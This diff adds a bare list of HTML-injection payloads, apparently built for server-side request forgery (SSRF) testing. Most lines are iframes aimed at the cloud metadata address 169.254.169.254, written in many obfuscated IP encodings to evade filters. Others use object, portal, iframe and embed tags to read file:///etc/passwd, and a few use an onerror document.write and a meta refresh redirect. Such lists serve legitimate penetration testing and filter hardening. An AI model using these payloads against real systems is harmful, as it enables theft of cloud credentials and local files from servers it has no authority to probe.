@@ -1,0 +1,22 @@
+"><iframe src="http://169.254.169.254/latest/dynamic/instance-identity/" height="500" width="500">
+"><iframe src="http://2852039166/latest/meta-data/" height="500" width="500">
+"><iframe src="http://[::ffff:a9fe:a9fe]/latest/meta-data/" height="500" width="500">
+"><iframe src="http://[0:0:0:0:0:ffff:a9fe:a9fe]/latest/meta-data/" height="500" width="500">
+"><iframe src="http://[0:0:0:0:0:ffff:169.254.169.254]/latest/meta-data/" height="500" width="500">
+"><iframe src="http://425.510.425.510/" height="500" width="500">
+"><iframe src="http://2852039166/" height="500" width="500">
+"><iframe src="http://7147006462/" height="500" width="500">
+"><iframe src="http://0xA9.0xFE.0xA9.0xFE/" height="500" width="500">
+"><iframe src="http://0xA9FEA9FE/" height="500" width="500">
+"><iframe src="http://0x41414141A9FEA9FE/" height="500" width="500">
+"><iframe src="http://0251.0376.0251.0376/" height="500" width="500">
+"><iframe src="http://0251.00376.000251.0000376/" height="500" width="500">
+"><iframe src="http://0251.254.169.254" height="500" width="500">
+<script> document.write(window.location) </script>
+<object data="file:///etc/passwd">   
+<portal src="file:///etc/passwd" id=portal>
+<iframe src=file:///etc/passwd></iframe>
+<embed src="file://etc/passwd>" width="400" height="400">
+<style><iframe src=”http://169.254.169.254/latest/meta-data/”> 
+<img src='x' onerror='document.write('<iframe src=http://169.254.169.254/latest/user-data></iframe>')'/>&text=&width=500&height=500
+<meta http-equiv="refresh" content="0;url=http://169.254.169.254" />
